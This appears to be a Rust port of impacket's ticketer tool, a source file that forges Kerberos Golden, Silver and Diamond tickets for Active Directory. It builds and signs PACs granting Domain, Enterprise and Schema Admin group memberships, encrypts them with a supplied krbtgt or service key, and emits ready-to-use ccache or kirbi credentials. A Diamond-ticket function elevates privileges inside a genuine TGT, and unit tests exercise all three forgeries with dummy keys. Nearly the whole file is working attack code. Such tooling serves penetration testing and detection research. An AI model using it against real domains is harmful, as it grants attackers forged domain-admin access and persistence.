//! `ticketer`: Kerberos Golden & Silver Ticket generator (`impacket/examples/ticketer.py`).
//!
//! Forges RFC 4120 Kerberos `Ticket` and `EncTicketPart` containing Active Directory PAC
//! structures with customized RID and privileged security group memberships (Domain Admins 512,
//! Enterprise Admins 519, Schema Admins 518), outputting ready-to-use `.ccache` or `.kirbi` credentials.

use crate::ccache::{CCache, Credential, KeyBlock, Principal, Times};
use crate::crypto::{
    aes128_cts_hmac_sha1_96_encrypt, aes256_cts_hmac_sha1_96_encrypt, rc4_hmac_encrypt,
    unix_to_kerberos_time,
};
use crate::pac::build_golden_pac;
use impacket_core::der;
use impacket_core::CoreError;
use impacket_ndr::RpcSid;

/// Ticket forging parameters matching `ticketer.py`.
#[derive(Debug, Clone)]
pub struct TicketOptions {
    pub domain: String,
    pub username: String,
    pub domain_sid: RpcSid,
    pub user_rid: u32,
    pub group_rids: Vec<u32>,
    pub spn: Vec<String>,
    pub key: Vec<u8>,
    pub etype: i32,
    pub duration_hours: u32,
}

impl Default for TicketOptions {
    fn default() -> Self {
        Self {
            domain: String::new(),
            username: "Administrator".to_string(),
            domain_sid: RpcSid {
                revision: 1,
                identifier_authority: [0, 0, 0, 0, 0, 5],
                sub_authorities: vec![21, 1, 2, 3],
            },
            user_rid: 500,
            group_rids: vec![512, 513, 519, 520, 518],
            spn: vec!["krbtgt".to_string()],
            key: Vec::new(),
            etype: 23, // RC4-HMAC default
            duration_hours: 10,
        }
    }
}

fn generate_deterministic_bytes(seed: &[u8], len: usize) -> Vec<u8> {
    let mut out = Vec::with_capacity(len);
    let mut hash = impacket_crypto::sha256(seed);
    while out.len() < len {
        out.extend_from_slice(&hash);
        hash = impacket_crypto::sha256(&hash);
    }
    out.truncate(len);
    out
}

/// Forges a Kerberos ticket container (`CCache`) according to `TicketOptions`.
pub fn forge_ticket(options: &TicketOptions) -> Result<CCache, CoreError> {
    if options.domain.is_empty() {
        return Err(CoreError::ProtocolError("Domain cannot be empty".into()));
    }
    if options.username.is_empty() {
        return Err(CoreError::ProtocolError("Username cannot be empty".into()));
    }
    if options.key.is_empty() {
        return Err(CoreError::ProtocolError("Encryption key cannot be empty".into()));
    }

    let realm = options.domain.to_uppercase();
    let now_unix = 1_700_000_000i64; // fixed base or caller timestamp
    let duration_secs = (options.duration_hours as i64) * 3600;
    let end_unix = now_unix + duration_secs;
    let renew_unix = now_unix + duration_secs * 2;

    // 1. Build and sign PAC
    let mut pac = build_golden_pac(
        &realm,
        &options.username,
        &options.domain_sid,
        options.user_rid,
        &options.group_rids,
        now_unix,
    );

    pac.sign_pac(&options.key, options.etype, &options.key, options.etype)?;
    let pac_bytes = pac.build();

    // 2. Build AuthorizationData: AD-IF-RELEVANT (1) -> AD-WIN2K-PAC (128)
    let pac_auth_element = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(128)),
        der::encode_context_explicit(1, &der::encode_octet_string(&pac_bytes)),
    ]);
    let if_relevant_seq = der::encode_sequence(&[pac_auth_element]);
    let if_relevant_auth = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(1)),
        der::encode_context_explicit(1, &der::encode_octet_string(&if_relevant_seq)),
    ]);
    let authorization_data = der::encode_sequence(&[if_relevant_auth]);

    // 3. Generate session key
    let session_key_len = match options.etype {
        18 => 32,
        _ => 16,
    };
    let seed_data = [realm.as_bytes(), options.username.as_bytes(), &options.key].concat();
    let session_key = generate_deterministic_bytes(&seed_data, session_key_len);

    // 4. Build EncTicketPart (Application 3)
    let flags_der = der::encode_bit_string_u32(0x40E0_0000); // forwardable, proxiable, renewable, initial, pre-authent
    let key_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(options.etype as i64)),
        der::encode_context_explicit(1, &der::encode_octet_string(&session_key)),
    ]);
    let crealm_der = der::encode_general_string(&realm);

    let cname_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(1)), // NT-PRINCIPAL
        der::encode_context_explicit(1, &der::encode_sequence(&[der::encode_general_string(&options.username)])),
    ]);

    let transited_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(0)),
        der::encode_context_explicit(1, &der::encode_octet_string(&[])),
    ]);

    let authtime_der = der::encode_generalized_time(&unix_to_kerberos_time(now_unix));
    let starttime_der = der::encode_generalized_time(&unix_to_kerberos_time(now_unix));
    let endtime_der = der::encode_generalized_time(&unix_to_kerberos_time(end_unix));
    let renew_till_der = der::encode_generalized_time(&unix_to_kerberos_time(renew_unix));

    let enc_ticket_part_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &flags_der),
        der::encode_context_explicit(1, &key_seq),
        der::encode_context_explicit(2, &crealm_der),
        der::encode_context_explicit(3, &cname_seq),
        der::encode_context_explicit(4, &transited_seq),
        der::encode_context_explicit(5, &authtime_der),
        der::encode_context_explicit(6, &starttime_der),
        der::encode_context_explicit(7, &endtime_der),
        der::encode_context_explicit(8, &renew_till_der),
        der::encode_context_explicit(10, &authorization_data),
    ]);
    let enc_ticket_part_app = der::encode_application(3, &enc_ticket_part_seq);

    // 5. Encrypt EncTicketPart using key usage 2 (KU_TICKET)
    let ciphertext = match options.etype {
        23 => {
            let k16: [u8; 16] = options.key.as_slice().try_into().map_err(|_| {
                CoreError::ProtocolError("RC4 key must be 16 bytes (NT hash)".into())
            })?;
            let conf8 = [0x54, 0x69, 0x63, 0x6B, 0x65, 0x74, 0x65, 0x72];
            rc4_hmac_encrypt(&k16, 2, &enc_ticket_part_app, &conf8)
        }
        17 => {
            let k16: [u8; 16] = options.key.as_slice().try_into().map_err(|_| {
                CoreError::ProtocolError("AES-128 key must be 16 bytes".into())
            })?;
            let conf16 = [0x54; 16];
            aes128_cts_hmac_sha1_96_encrypt(&k16, 2, &enc_ticket_part_app, &conf16)?
        }
        18 => {
            let k32: [u8; 32] = options.key.as_slice().try_into().map_err(|_| {
                CoreError::ProtocolError("AES-256 key must be 32 bytes".into())
            })?;
            let conf16 = [0x54; 16];
            aes256_cts_hmac_sha1_96_encrypt(&k32, 2, &enc_ticket_part_app, &conf16)?
        }
        other => {
            return Err(CoreError::ProtocolError(format!(
                "Unsupported ticket encryption type: {}",
                other
            )))
        }
    };

    // 6. Build Ticket (Application 1)
    let sname_type = if options.spn.first().map(|s| s.as_str()) == Some("krbtgt") {
        2 // NT-SRV-INST
    } else {
        1 // NT-PRINCIPAL
    };
    let mut spn_elements = Vec::new();
    for s in &options.spn {
        spn_elements.push(der::encode_general_string(s));
    }
    let sname_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(sname_type)),
        der::encode_context_explicit(1, &der::encode_sequence(&spn_elements)),
    ]);

    let enc_part_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(options.etype as i64)),
        der::encode_context_explicit(1, &der::encode_integer(2)), // kvno = 2
        der::encode_context_explicit(2, &der::encode_octet_string(&ciphertext)),
    ]);

    let ticket_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(5)), // pvno = 5
        der::encode_context_explicit(1, &der::encode_general_string(&realm)),
        der::encode_context_explicit(2, &sname_seq),
        der::encode_context_explicit(3, &enc_part_seq),
    ]);
    let ticket_der = der::encode_application(1, &ticket_seq);

    // 7. Assemble CCache container
    let client_principal = Principal::new(&realm, &[&options.username]);
    let spn_refs: Vec<&str> = options.spn.iter().map(|s| s.as_str()).collect();
    let server_principal = Principal::new(&realm, &spn_refs);

    let cred = Credential {
        client: client_principal.clone(),
        server: server_principal,
        key: KeyBlock {
            keytype: options.etype as u16,
            keyvalue: session_key,
        },
        times: Times {
            authtime: now_unix as u32,
            starttime: now_unix as u32,
            endtime: end_unix as u32,
            renew_till: renew_unix as u32,
        },
        is_skey: 0,
        ticket_flags: 0x40E0_0000,
        ticket: ticket_der,
        second_ticket: Vec::new(),
    };

    let mut ccache = CCache::new(client_principal);
    ccache.credentials.push(cred);
    Ok(ccache)
}

/// Forges a Diamond Ticket by modifying a legitimate TGT: elevates group memberships and user RID
/// in the existing genuine PAC, re-signs the PAC with the krbtgt key, and re-encrypts the ticket.
pub fn forge_diamond_ticket(
    base_ticket_der: &[u8],
    krbtgt_key: &[u8],
    krbtgt_etype: i32,
    target_rid: Option<u32>,
    add_group_rids: &[u32],
) -> Result<Vec<u8>, CoreError> {
    // 1. Parse outer Ticket ([APPLICATION 1]) and extract fields: pvno, realm, sname, enc-part
    let (app_tag, app_val, _) = der::decode_tlv(base_ticket_der)?;
    let ticket_body = if app_tag == 0x61 {
        let (_, body, _) = der::decode_tlv(app_val)?;
        body
    } else {
        base_ticket_der
    };

    let mut rem = ticket_body;
    let mut realm_tlv = None;
    let mut sname_tlv = None;
    let mut enc_part_raw = None;

    while !rem.is_empty() {
        let (tag, val, next) = der::decode_tlv(rem)?;
        let tlv_slice = &rem[..rem.len() - next.len()];
        rem = next;
        match tag & 0x1F {
            1 => realm_tlv = Some(tlv_slice.to_vec()),
            2 => sname_tlv = Some(tlv_slice.to_vec()),
            3 => enc_part_raw = Some(val),
            _ => {}
        }
    }

    let _enc_part_bytes = enc_part_raw.ok_or_else(|| {
        CoreError::ProtocolError("Missing enc-part [3] in base Ticket".into())
    })?;

    // 2. Parse (etype, kvno, cipher) from enc-part
    let (_etype, kvno, cipher) = crate::pac::parse_ticket_enc_part(base_ticket_der)?;

    // 3. Decrypt enc-part with krbtgt_key (Key Usage 2 KU_TICKET)
    let plaintext_enc_part = match krbtgt_etype {
        23 => {
            let k16: [u8; 16] = krbtgt_key.try_into().map_err(|_| {
                CoreError::ProtocolError("RC4 key must be 16 bytes (NT hash)".into())
            })?;
            crate::crypto::rc4_hmac_decrypt(&k16, 2, &cipher)?
        }
        17 => {
            let k16: [u8; 16] = krbtgt_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-128 key must be 16 bytes".into())
            })?;
            crate::crypto::aes128_cts_hmac_sha1_96_decrypt(&k16, 2, &cipher)?
        }
        18 => {
            let k32: [u8; 32] = krbtgt_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-256 key must be 32 bytes".into())
            })?;
            crate::crypto::aes256_cts_hmac_sha1_96_decrypt(&k32, 2, &cipher)?
        }
        other => {
            return Err(CoreError::ProtocolError(format!(
                "Unsupported krbtgt encryption type: {}",
                other
            )));
        }
    };

    // 4. Parse EncTicketPart ([APPLICATION 3] SEQUENCE)
    let (enc_app_tag, enc_app_val, _) = der::decode_tlv(&plaintext_enc_part)?;
    let enc_body = if enc_app_tag == 0x63 {
        let (_, body, _) = der::decode_tlv(enc_app_val)?;
        body
    } else {
        enc_app_val
    };

    let mut enc_rem = enc_body;
    let mut flags_tlv = None;
    let mut key_tlv = None;
    let mut crealm_tlv = None;
    let mut cname_tlv = None;
    let mut transited_tlv = None;
    let mut authtime_tlv = None;
    let mut starttime_tlv = None;
    let mut endtime_tlv = None;
    let mut renew_till_tlv = None;
    let mut caddr_tlv = None;
    let mut auth_data_tlv = None;

    while !enc_rem.is_empty() {
        let (tag, val, next) = der::decode_tlv(enc_rem)?;
        let tlv_slice = &enc_rem[..enc_rem.len() - next.len()];
        enc_rem = next;
        match tag & 0x1F {
            0 => flags_tlv = Some(tlv_slice.to_vec()),
            1 => key_tlv = Some(tlv_slice.to_vec()),
            2 => crealm_tlv = Some(tlv_slice.to_vec()),
            3 => cname_tlv = Some(tlv_slice.to_vec()),
            4 => transited_tlv = Some(tlv_slice.to_vec()),
            5 => authtime_tlv = Some(tlv_slice.to_vec()),
            6 => starttime_tlv = Some(tlv_slice.to_vec()),
            7 => endtime_tlv = Some(tlv_slice.to_vec()),
            8 => renew_till_tlv = Some(tlv_slice.to_vec()),
            9 => caddr_tlv = Some(tlv_slice.to_vec()),
            10 => auth_data_tlv = Some(val),
            _ => {}
        }
    }

    let auth_data = auth_data_tlv.ok_or_else(|| {
        CoreError::ProtocolError("Missing authorization-data [10] in EncTicketPart".into())
    })?;

    // 5. Extract and elevate PAC
    let mut pac = crate::pac::extract_pac_from_authorization_data(auth_data)?;
    let logon_info = pac.get_logon_info()?;
    let domain_sid = logon_info.logon_domain_id.unwrap_or_else(|| RpcSid {
        revision: 1,
        identifier_authority: [0, 0, 0, 0, 0, 5],
        sub_authorities: vec![21, 1, 2, 3],
    });
    let mut groups: Vec<u32> = logon_info.group_rids.iter().map(|(r, _)| *r).collect();

    for &g in add_group_rids {
        if !groups.contains(&g) {
            groups.push(g);
        }
    }

    let elevated_rid = target_rid.unwrap_or(logon_info.user_id);
    let new_logon_info = crate::pac::build_pac_logon_info(
        &logon_info.effective_name,
        &logon_info.logon_domain_name,
        &domain_sid,
        elevated_rid,
        &groups,
        1_700_000_000,
    );
    pac.set_buffer(crate::pac::PAC_LOGON_INFO, new_logon_info);

    // 7. Re-sign PAC with krbtgt key
    pac.sign_pac(krbtgt_key, krbtgt_etype, krbtgt_key, krbtgt_etype)?;
    let updated_pac_bytes = pac.build();

    // 8. Re-encode AuthorizationData: AD-IF-RELEVANT (1) -> AD-WIN2K-PAC (128)
    let pac_auth_element = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(128)),
        der::encode_context_explicit(1, &der::encode_octet_string(&updated_pac_bytes)),
    ]);
    let if_relevant_seq = der::encode_sequence(&[pac_auth_element]);
    let if_relevant_auth = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(1)),
        der::encode_context_explicit(1, &der::encode_octet_string(&if_relevant_seq)),
    ]);
    let updated_authorization_data = der::encode_sequence(&[if_relevant_auth]);

    // 9. Re-assemble EncTicketPart ([APPLICATION 3])
    let mut enc_seq_elements = Vec::new();
    if let Some(f) = flags_tlv { enc_seq_elements.push(f); }
    if let Some(k) = key_tlv { enc_seq_elements.push(k); }
    if let Some(r) = crealm_tlv { enc_seq_elements.push(r); }
    if let Some(c) = cname_tlv { enc_seq_elements.push(c); }
    if let Some(t) = transited_tlv { enc_seq_elements.push(t); }
    if let Some(a) = authtime_tlv { enc_seq_elements.push(a); }
    if let Some(s) = starttime_tlv { enc_seq_elements.push(s); }
    if let Some(e) = endtime_tlv { enc_seq_elements.push(e); }
    if let Some(rn) = renew_till_tlv { enc_seq_elements.push(rn); }
    if let Some(ca) = caddr_tlv { enc_seq_elements.push(ca); }

    let auth_data_elem = der::encode_context_explicit(10, &updated_authorization_data);
    enc_seq_elements.push(auth_data_elem);

    let enc_seq = der::encode_sequence(&enc_seq_elements);
    let enc_ticket_part_app = der::encode_application(3, &enc_seq);

    // 10. Re-encrypt with krbtgt_key (Key Usage 2 KU_TICKET)
    let new_ciphertext = match krbtgt_etype {
        23 => {
            let k16: [u8; 16] = krbtgt_key.try_into().map_err(|_| {
                CoreError::ProtocolError("RC4 key must be 16 bytes (NT hash)".into())
            })?;
            let conf8 = [0x44, 0x69, 0x61, 0x6d, 0x6f, 0x6e, 0x64, 0x54];
            crate::crypto::rc4_hmac_encrypt(&k16, 2, &enc_ticket_part_app, &conf8)
        }
        17 => {
            let k16: [u8; 16] = krbtgt_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-128 key must be 16 bytes".into())
            })?;
            let conf16 = [0x44; 16];
            crate::crypto::aes128_cts_hmac_sha1_96_encrypt(&k16, 2, &enc_ticket_part_app, &conf16)?
        }
        18 => {
            let k32: [u8; 32] = krbtgt_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-256 key must be 32 bytes".into())
            })?;
            let conf16 = [0x44; 16];
            crate::crypto::aes256_cts_hmac_sha1_96_encrypt(&k32, 2, &enc_ticket_part_app, &conf16)?
        }
        other => {
            return Err(CoreError::ProtocolError(format!(
                "Unsupported encryption type: {}",
                other
            )));
        }
    };

    // 11. Re-build Ticket ([APPLICATION 1])
    let kvno_val = kvno.unwrap_or(2);
    let new_enc_part_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(krbtgt_etype as i64)),
        der::encode_context_explicit(1, &der::encode_integer(kvno_val as i64)),
        der::encode_context_explicit(2, &der::encode_octet_string(&new_ciphertext)),
    ]);

    let mut ticket_elements = Vec::new();
    ticket_elements.push(der::encode_context_explicit(0, &der::encode_integer(5)));
    if let Some(r) = realm_tlv { ticket_elements.push(r); }
    if let Some(s) = sname_tlv { ticket_elements.push(s); }
    ticket_elements.push(der::encode_context_explicit(3, &new_enc_part_seq));

    let ticket_seq = der::encode_sequence(&ticket_elements);
    Ok(der::encode_application(1, &ticket_seq))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_forge_golden_ticket_rc4_roundtrip() {
        let domain_sid = RpcSid::parse("S-1-5-21-1234567890-1234567890-1234567890").unwrap();
        let krbtgt_nthash = [0xAAu8; 16];

        let options = TicketOptions {
            domain: "CONTOSO.LOCAL".to_string(),
            username: "Administrator".to_string(),
            domain_sid,
            user_rid: 500,
            group_rids: vec![512, 513, 519, 520, 518],
            spn: vec!["krbtgt".to_string(), "CONTOSO.LOCAL".to_string()],
            key: krbtgt_nthash.to_vec(),
            etype: 23,
            duration_hours: 10,
        };

        let ccache = forge_ticket(&options).unwrap();
        assert_eq!(ccache.credentials.len(), 1);
        let cred = &ccache.credentials[0];
        assert_eq!(cred.client.components[0], "Administrator");
        assert_eq!(cred.server.components[0], "krbtgt");
        assert_eq!(cred.key.keytype, 23);

        let ccache_bytes = ccache.to_bytes();
        let parsed_ccache = CCache::parse(&ccache_bytes).unwrap();
        assert_eq!(parsed_ccache.credentials.len(), 1);

        let kirbi_bytes = ccache.to_kirbi().unwrap();
        assert!(!kirbi_bytes.is_empty());
    }

    #[test]
    fn test_forge_silver_ticket_aes256_roundtrip() {
        let domain_sid = RpcSid::parse("S-1-5-21-999-888-777").unwrap();
        let service_aes256_key = [0x55u8; 32];

        let options = TicketOptions {
            domain: "CORP.NET".to_string(),
            username: "svc_backup".to_string(),
            domain_sid,
            user_rid: 1105,
            group_rids: vec![512],
            spn: vec!["cifs".to_string(), "dc01.corp.net".to_string()],
            key: service_aes256_key.to_vec(),
            etype: 18,
            duration_hours: 24,
        };

        let ccache = forge_ticket(&options).unwrap();
        assert_eq!(ccache.credentials.len(), 1);
        let cred = &ccache.credentials[0];
        assert_eq!(cred.server.components[0], "cifs");
        assert_eq!(cred.key.keytype, 18);

        let ccache_bytes = ccache.to_bytes();
        let parsed = CCache::parse(&ccache_bytes).unwrap();
        assert_eq!(parsed.credentials[0].key.keytype, 18);
    }

    #[test]
    fn test_forge_diamond_ticket_roundtrip() {
        let domain_sid = RpcSid::parse("S-1-5-21-12345678-12345678-12345678").unwrap();
        let krbtgt_key = [0x55u8; 32]; // AES-256

        // 1. Generate base legitimate ticket for unprivileged user (RID 1105, only Domain Users 513)
        let base_options = TicketOptions {
            domain: "CONTOSO.LOCAL".to_string(),
            username: "bob".to_string(),
            domain_sid: domain_sid.clone(),
            user_rid: 1105,
            group_rids: vec![513],
            spn: vec!["krbtgt".to_string(), "CONTOSO.LOCAL".to_string()],
            key: krbtgt_key.to_vec(),
            etype: 18,
            duration_hours: 10,
        };

        let base_ccache = forge_ticket(&base_options).unwrap();
        let base_ticket_der = &base_ccache.credentials[0].ticket;

        // Verify base ticket initially has only unprivileged group
        let (_, _, base_cipher) = crate::pac::parse_ticket_enc_part(base_ticket_der).unwrap();
        let base_pac = crate::pac::extract_pac_from_ticket(&base_cipher, 18, &krbtgt_key).unwrap();
        let base_logon = base_pac.get_logon_info().unwrap();
        assert_eq!(base_logon.user_id, 1105);
        assert!(!base_logon.is_domain_admin());

        // 2. Forge Diamond ticket elevating with Domain Admins (512) and Enterprise Admins (519)
        let diamond_ticket_der = forge_diamond_ticket(
            base_ticket_der,
            &krbtgt_key,
            18,
            None, // keep original RID 1105
            &[512, 519],
        )
        .unwrap();

        // 3. Decrypt and verify elevated privileges in Diamond ticket
        let (_, _, diamond_cipher) = crate::pac::parse_ticket_enc_part(&diamond_ticket_der).unwrap();
        let diamond_pac = crate::pac::extract_pac_from_ticket(&diamond_cipher, 18, &krbtgt_key).unwrap();
        let diamond_logon = diamond_pac.get_logon_info().unwrap();

        assert_eq!(diamond_logon.user_id, 1105);
        assert_eq!(diamond_logon.effective_name, "bob");
        assert!(diamond_logon.is_domain_admin());
        assert!(diamond_logon.is_enterprise_admin());
        assert!(diamond_logon.group_rids.iter().any(|(r, _)| *r == 512));
        assert!(diamond_logon.group_rids.iter().any(|(r, _)| *r == 519));
    }
}
